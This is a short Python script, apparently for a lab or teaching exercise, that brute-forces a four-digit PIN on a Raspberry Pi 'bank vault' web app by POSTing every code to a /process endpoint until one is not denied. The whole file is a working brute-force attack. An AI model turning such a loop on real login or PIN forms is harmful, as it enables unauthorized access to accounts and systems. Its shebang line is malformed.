#!/user/bin python3

# Disclaimer: This script is for educational purposes only.  
# Do not use against any server that you don't own or have authorization to test. 
# To run this script use:
# sudo python3 brute_force.py <Rasperry Pi Server IP> <Port> (ex. python3 brute_force.py 10.80.211.100 5000)

import requests
import sys
import time

def print_header():
    """ This function prints header. """
    # Program Header
    print(r""" 
    ███    ███ ██    ██ ███    ██ ██ ███    ██ ███    ██ 
    ████  ████ ██    ██ ████   ██ ██ ████   ██ ████   ██ 
    ██ ████ ██ ██    ██ ██ ██  ██ ██ ██ ██  ██ ██ ██  ██ 
    ██  ██  ██ ██    ██ ██  ██ ██    ██  ██ ██ ██  ██ ██ 
    ██      ██  ██████  ██   ████ ██ ██   ████ ██   ████                          
                                                     """)
    print("\n****************************************************************")
    print("\n* Copyright of Aleks Holland Johansen, 2023                    *")
    print("\n* https://github.com/AleksHolland84                            *")
    print("\n****************************************************************")
    print("_________________________________________________________")

if __name__ == "__main__":
    print_header()
    print(f"Brute-forcing: {sys.argv[1]} on port: {sys.argv[2]}")
    time.sleep(4)

    try:
        url = sys.argv[1]
        port = sys.argv[2]
        protocol = "http://"
    except IndexError:
        raise SystemExit(f"Usage: {sys.argv[0]} <bank_vault_IP> <PORT>")

    for i in range(1,10000): # 0000 locks the vault
        pin = str(i).zfill(4)
        print(f"Trying with pin: {pin}")

        payload = {"pincode": pin}
        response = requests.post(f"{protocol}{url}:{port}/process", data = payload)

        if "DENIED"  in response.text:
            print(f"PIN {pin} DENIED")

        else:
            print(f"""################### ACCESS WITH PIN: {pin} ####################""")
            break
        time.sleep(0.1)
